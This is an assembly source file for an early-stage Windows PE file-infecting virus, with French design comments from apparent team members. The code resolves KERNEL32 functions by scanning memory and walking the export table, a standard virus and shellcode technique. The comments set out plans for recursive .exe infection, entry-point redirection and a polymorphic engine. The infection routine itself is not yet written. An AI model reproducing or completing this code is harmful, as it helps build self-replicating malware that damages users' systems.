; donothing.asm FOR 32 BIT archs only
; DELTA OFFSET // CALL 0 => data a la fin
; new section -> addr la plus grande d une section + sa taille
; si pas la place -> quit
; bonuis: UPX unpacker
; bonus: infecte peut infecter
; bonus: ne pas modifier entry point
; bonus: polymorphique obligatoire
 
.386
.model flat, stdcall
option casemap :none
    
    include \masm32\include\windows.inc
    include \masm32\include\user32.inc
    include \masm32\include\kernel32.inc

    includelib \masm32\lib\user32.lib
    includelib \masm32\lib\kernel32.lib

.data
    ; Mettre ca a la fin (decommenter)
    ; + liste d'API -> load their address en memoire

    WndTextOut1 db  "Address: 0x"
    WndTextOut2 db  8 dup (66), 13, 10
    WndTextFmt  db  "%08x",0
    Error       db  "Error",0
    NewLine     db  "  ",0
    exportName  db  "ExitProcess",0
 
.code

start:  

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Find the KERNEL32 base address, works at the entry point of the program
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     esi,[esp]
    and     esi,0FFFF0000h

find_PE:
    sub     esi,1000h           ; find the DOS Header (aligned on 0x1000)
    cmp     word ptr [esi],"ZM"
    jne     find_PE
    
    mov     ecx,[esi+3Ch]       ; offset to EXE header
    lea     edi,[esi+ecx]       ; address of the EXE header
    cmp     word ptr [edi],"EP" ; double check with the "PE" magic
    jne     exit_fail

; DELTA OFFSET to retrieve any variable address
    ;call deltaoffset
;deltaoffset:
    ;pop ebp ; put EIP in ebp

; Example how to retrieve address of Error variable
    ;mov eax,ebp
    ;add eax,offset Error
    ;sub eax,offset deltaoffset

; IMPORTANT: NE JAMAIS PLUS FAIRE DE call si on veut utiliser cette methode
; Ou alors passer EBP en parametre car c'est la base absolue pour retrouver
; nos adresses de variables

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; MARC: Le code ci-dessus doit etre execute imperativement
; au niveau du point d'entree du programme (start) car il recupere des 
; valeurs push-ed sur la stack par KERNEL32 avant de donner la main a notre
; point d'entree, on utilise ca pour remonter dans son address space et 
; faire joujou.
; Le code ci-dessous utilise les valeurs recuperees, c'est un exemple pour 
; toi. edi et esi doivent donc etre disponible pour toi tout au long de 
; ton code. Ce sont les offset vers les header DOS et EXE (PE) qui permettent
; de retrouver d'autres informations de facon sure.
; Tu as acces a toutes les fonctions de KERNEL32.dll via ma fonction
; ent_get_function_addr, elle prend en parametre (inverser l'ordre)
; ESI,EDI dont je t'ai parle ainsi que l'addresse d'une chaine de
; charactere terminee par '\0', c'est le nom de la fonction que tu veux
; appelee, une fois que tu as ca, tu lui balances tes arguments et tu 
; fais un "call eax" puisque les valeurs de retour sont dans eax par defaut.
;
; Note de style, ebx,esi,edi,ebp et esp sont des registres qui ne doivent
; pas etre modifies par une fonction, donc tu verras des push en folie 
; dans toutes mes fonctions, je t'invite a faire de meme, ca evite de se 
; tirer les cheveux avec des registres qui changent sans que tu le saches.
; C'est une convention, donc les fonctions systeme doivent respecter ca,
; dans le pire des cas, "pushad" et "popad" peuvent entourer les appels
; afin de sauver et restorer tous les registres generiques.
; 
; Ce que tu dois nous rendre: des points d'entrees vers au moins une fonction
; qui va au moins faire ce que font tous les virus: se repliquer. Ca va
; donc te demander d'ouvrir par exemple tous les .exe en recursif dans 
; un chemin, et ajouter ton code a une adresse precise (adrien et moi on va
; bosser sur ca donc pars du principe que la fonction qui analyze le .exe
; prend un FD en param et te renvoie l'offset vers la ou tu dois mettre ton 
; code et donc decaller le code existant). Dans un premier temps si tu peux
; juste infecter un truc, pop up une fenetre kikoo et faire ExitProcess, ca 
; sera bien, tu verras plus tard comment decaller bien le code, en fait on fera
; surement une fonction qui fera de la place ailleurs, on modifiera le point 
; d'entree pour pointer sur ton code, et a la fin de ton code on fera un jump
; pour retourner la ou il faut et continuer l'execution du truc.
; Penses bien qu'on fera un moteur polymorphique, donc surement un truc pas tres 
; avance qui lira tes opcodes en memoire (donc fais bien ton code de facon contigue)
; 
; Ce fichier actuel possede quelques fonctions output_str et output_addr pour le debug,
; ne les utilises pas toi, utilises seulement "call eax". Elles vont disparaitre.
;
; Si t'as des remarques sur le design ou des suggestions contacte-moi !
; Bon courage,
; Ben
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    push    offset exportName
    push    edi
    push    esi
    call    ent_get_function_addr   ; Get the function's address in eax
    ;Example:
    ;push   arg1
    ;push   arg2
    ;call   eax
    call    exit_success

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Explore the ENT (Export Name Table) of KERNEL32
; And return the matching function address
; 3 params: 
;   pointer to the DOS header -> ebp + 8
;   pointer to the PE header -> ebp + 12
;   pointer to the function name -> ebp + 16
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ent_get_function_addr:

    ; Set up a stack frame 
    push    ebp
    mov     ebp,esp
    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     edi,[ebp+8]
    mov     esi,[ebp+12]
    mov     esi,[esi+78h]       ; EXPORT table (RVA)
    mov     edx,[esi+edi+18h]   ; Number of names
    mov     ebx,[esi+edi+20h]   ; Address of names (RVA)
    add     ebx,edi             ; Address of names (absolute)

    ; STEP 1: get the name index in the name array
    push    [ebp + 16]
    push    edx
    push    [ebp+8]
    push    ebx
    call    ent_find_name

    ; STEP 2: get the ordinal in the ordinal array
    push    eax                 ; Index of name
    mov     edx,[esi+edi+10h]   ; Base ordinal
    push    edx
    mov     ebx,[esi+edi+24h]   ; Address of ordinals (RVA)
    add     ebx,edi             ; Address of ordinals (absolute)
    push    ebx
    call    ent_ordinal

    ; STEP 3: get the address in the function address array
    push    [ebp+8]
    push    eax
    mov     ebx,[esi+edi+1Ch]   ; Address of function addresses (RVA)
    add     ebx,edi             ; Address of function addresses (absolute)
    push    ebx
    call    ent_function

    pop     edi
    pop     esi
    pop     ebx
    mov     esp,ebp
    pop     ebp
    ret     12

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; Returns the index the function name
; 4 params: 
;   pointer to the ENT name array (absolute) -> ebp + 8
;   pointer to the DOS header (absolute) -> ebp + 12
;   Number of names -> ebp + 16
;   pointer to the name to look for -> ebp + 20
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ent_find_name:

    ; Set up a stack frame 
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+20]    ; Name to look for
    mov     edx,[ebp+16]    ; Number of names
    mov     ecx,0           ; Initialize the counter
ent_next_name:

    mov     ebx,[ebp+8]
    mov     ebx,[ebx+ecx*4] ; First name pointer (RVA)
    mov     eax,[ebp+12]
    add     ebx,eax         ; First name pointer

    push    ecx             ; Save edx
    push    edx             ; Save edx
    ; un/comment to hide/see all the available functions
    push    ebx
    call    output_str
    push    ebx
    call    output_addr
    push    ebx
    push    esi
    call    strcmp_
    pop     edx             ; Restore edx
    pop     ecx             ; Restore ecx

    cmp     eax,0           ; Did we find the string?
    je      ent_name_success

    dec     edx        
    jz      ent_name_done   ; No more names

    inc     ecx
    jmp     ent_next_name   ; Get next name

    ent_name_success:
    mov     eax,ecx
    jmp     ent_name_done

    ent_name_fail:
    mov     eax,-1          ; Return NULL, failed
    jmp     exit_fail

    ent_name_done:

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     16

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; sub-routine: returns the name ordinal
; 3 params: 
;   pointer to the ENT ordinal array (absolute) -> ebp + 8
;   base ordinal DWORD -> ebp + 12
;   index of the function name -> ebp + 16
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ent_ordinal:

    ; Set up a stack frame 
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+8]     ; ordinal array (WORD*)
    mov     edx,[ebp+12]    ; base ordinal
    mov     ecx,[ebp+16]    ; index of function name

    xor     eax,eax
    mov     ax,[esi+ecx*2]

    ; XXX: adding base gives a wrong ordinal...
    ; the one already there is correct so well... oO
    ;add     eax,edx

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     12

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; sub-routine: returns the function's address
; 2 params: 
;   pointer to the ENT function array (absolute) -> ebp + 8
;   function ordinal (DWORD) -> ebp + 12
;   pointer to DOS header -> ebp + 16
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
ent_function:

    ; Set up a stack frame 
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+8]     ; function array
    mov     ecx,[ebp+12]    ; index
    mov     edx,[ebp+16]    ; DOS header of KERNEL32

    mov     eax,[esi+ecx*4] ; function RVA
    add     eax,edx         ; function address

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     12

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;    
; Iterate on all section headers (ebx) 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;          
    lea     ebx,[edi+SIZEOF IMAGE_NT_HEADERS]   ; address of the first IMAGE_SECTION_HEADER
    mov     dx,[edi+6h]                         ; number of sections

iterate_section:

    cmp     dx,0
    jle     exit_success ; my work here is done, I have to goooo

    ; DEBUG output (optional)
    push    ecx         ; save ecx
    push    edx         ; save edx
    push    ebx
    call    output_str
    push    ebx
    call    output_addr
    pop     edx         ; restore edx
    pop     ecx         ; restore ecx

    ; get next section header's address
    add     ebx,SIZEOF IMAGE_SECTION_HEADER
    dec     edx
    jmp     iterate_section





;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; FUNCTIONS
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

strlen_:
    ; Set up a stack frame 
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+8]
    xor     eax,eax ; zero out eax
    xor     ebx,ebx ; zero out ebx
strlen_iterate:
    mov     bl,[esi]
    test    bl,bl
    jz      strlen_done
    inc     eax
    inc     esi
    jmp     strlen_iterate
strlen_done:
    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     4

strcmp_:
    ; Set up a stack frame 
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    mov     esi,[ebp+8]
    mov     edi,[ebp+12]
    xor     eax,eax ; zero out eax
    xor     ebx,ebx ; zero out ebx
strcmp_iterate:
    mov     bl,[esi]
    mov     al,[edi]
    test    bl,bl
    ; end of string
    jz      strcmp_done
    test    al,al
    jz      strcmp_done
    ; check for difference
    cmp     al,bl
    jne     strcmp_done
    inc     esi
    inc     edi
    jmp     strcmp_iterate

strcmp_done:
    sub     eax,ebx

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     8

output_str:    
    ; takes one address pushed on the stack 
    ; and prints the string it's pointing to

    ; Set up a stack frame 
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    push    STD_OUTPUT_HANDLE
    call    GetStdHandle
    mov     ebx,eax

    ; Call strlen_ (put the result in eax)
    push    [ebp+8]
    call    strlen_

    push    NULL
    push    NULL
    push    eax
    push    [ebp+8]
    push    ebx
    call    WriteFile    

    push    NULL
    push    NULL
    push    2
    push    offset NewLine
    push    ebx
    call    WriteFile

    mov     eax,0

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     4

output_addr:
    ; takes one address pushed on the stack 
    ; and prints it out

    ; Set up a stack frame 
    push    ebp
    mov     ebp,esp

    ; Saves context
    push    ebx
    push    esi
    push    edi

    push    [ebp+8]      ; first argument: the address to output
    push    offset WndTextFmt
    push    offset WndTextOut2
    call    wsprintfA   ; uses _cdecl O.o ...
    add     esp,12      ; discard elements pushed on the stack

    push    STD_OUTPUT_HANDLE
    call    GetStdHandle
    
    push    NULL
    push    NULL
    push    SIZEOF WndTextOut1 + SIZEOF WndTextOut2
    push    offset WndTextOut1
    push    eax
    call    WriteFile

    mov     eax,0

    pop     edi
    pop     esi
    pop     ebx

    mov     esp,ebp
    pop     ebp
    ret     4

exit_success:
    push    0
    call    ExitProcess

exit_fail:
    push    1
    call    ExitProcess

; All the virus data: use delta offset
;virus_data:

    ;WndTextOut1 db  "Address: 0x"
    ;WndTextOut2 db  8 dup (66), 13, 10
    ;WndTextFmt  db  "%08x",0
    ;Error       db  "Error",0
    ;NewLine     db  "  ",0
    ;exportName  db  "ExitProcess",0

end start